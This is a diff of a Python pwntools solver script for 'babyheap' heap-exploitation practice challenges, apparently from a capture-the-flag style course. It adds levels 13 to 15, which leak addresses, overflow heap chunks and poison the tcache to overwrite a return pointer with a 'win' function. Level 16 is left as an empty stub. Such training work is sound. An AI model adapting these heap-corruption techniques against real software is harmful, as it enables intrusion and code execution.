@@ -3,7 +3,7 @@ from pwn import *
 
 
 def prepare(p):
-    p.recvuntil('quit):')
+    print(p.recvuntil('quit):'))
 
 def malloc(p, size: str):
     prepare(p)
@@ -47,10 +47,21 @@ def echo_id(p, index, offset):
     p.sendline(index)
     p.sendline(offset)
 
+def read_id(p, index, length, content):
+    prepare(p)
+    p.sendline('read')
+    p.sendline(index)
+    p.sendline(length)
+    p.sendline(content)
+
 def stack_scanf(p, content):
     prepare(p)
     p.sendline('stack_scanf')
     p.sendline(content)
+
+def stack_free(p):
+    prepare(p)
+    p.sendline('stack_free')
 
 def get_addr(p):
     for _ in range(7):
@@ -176,12 +187,83 @@ def level12(p):
     free_id(p, b'0')
     stack_scanf(p, b'A'*0x30 + p64(0x50)*2)
 
-#p = process('/challenge/babyheap_level12.1')
-#p = process(['./ld-2.31.so', '--preload', './libc.so.6', './babyheap_level12.1'])
-p = gdb.debug(['./ld-2.31.so', '--preload', './libc.so.6', './babyheap_level12.1'], gdbscript= '''
-set follow-fork-mode parent
-c
-''')
+def level13(p):
+    for _ in range(4):
+        data = p.recvline()
+        print(data)
+    stack_scanf(p, b'A'*56 + p64(0x100))
+    stack_free(p)
+    malloc_id(p, b'0', b'240')
+    scanf_id(p, b'A'*180, b'0')
 
-level12(p)
+def level14(p):
+    ''''''
+    stack_scanf(p, b'A'*0x38 + p64(0x100))
+    stack_free(p)
+    malloc_id(p, b'0', b'240')
+    echo_id(p, b'0', b'40')
+    for _ in range(4):
+        addr = p.recvline() 
+    addr = addr.split(b' ')[1].strip()
+    addr = u64(addr.ljust(8, b'\x00'))
+    win = addr - 0x72f
+    print(hex(win))
+    echo_id(p, b'0', b'64')
+    for _ in range(4):
+        addr = p.recvline() 
+    addr = addr.split(b' ')[1].strip()
+    addr = u64(addr.ljust(8, b'\x00'))
+    ret_ptr = addr - 0xe8
+    print('addr: ', hex(ret_ptr))
+    malloc_id(p, b'1', b'240')
+    free_id(p, b'1')
+    free_id(p, b'0')
+    scanf_id(p, p64(ret_ptr), b'0')
+    malloc_id(p, b'2', b'240')
+    malloc_id(p, b'2', b'240')
+    scanf_id(p, p64(win) ,b'2')
+
+def level15(p):
+    ''''''
+    # Get win addr
+    malloc_id(p, b'0', b'16')
+    echo_id(p, b'0', b'0')
+    echo_id(p, b'0', b'32')
+    for _ in range(4):
+        addr = p.recvline()
+    addr = addr.split(b' ')[1].strip()
+    addr = u64(addr.ljust(8, b'\x00'))
+    win = addr - 0xd10
+
+    # Get stack ret ptr
+    echo_id(p, b'0', b'40')
+    for _ in range(4):
+        addr = p.recvline()
+    addr = addr.split(b' ')[1].strip()
+    addr = u64(addr.ljust(8, b'\x00'))
+    ret_ptr = addr + 0x176
+
+    # Create 3 chunks, do overflow to write addr
+    malloc_id(p, b'0', b'16')
+    malloc_id(p, b'1', b'16')
+    malloc_id(p, b'2', b'16')
+    free_id(p, b'2')
+    free_id(p, b'1')
+    read_id(p, b'0', b'40', b'A'*32 + p64(ret_ptr))
+    malloc_id(p, b'3', b'16')
+    malloc_id(p, b'3', b'16')
+    read_id(p, b'3', b'8', p64(win))
+
+def level16(p):
+    ''''''
+    
+
+#p = process('/challenge/babyheap_level16.0')
+p = process(['./ld-2.31.so', '--preload', './libc.so.6', './babyheap_level16.0'])
+#p = gdb.debug(['./ld-2.31.so', '--preload', './libc.so.6', './babyheap_level16.0'], gdbscript= '''
+#set follow-fork-mode parent
+#c
+#''')
+
+level16(p)
 p.interactive()
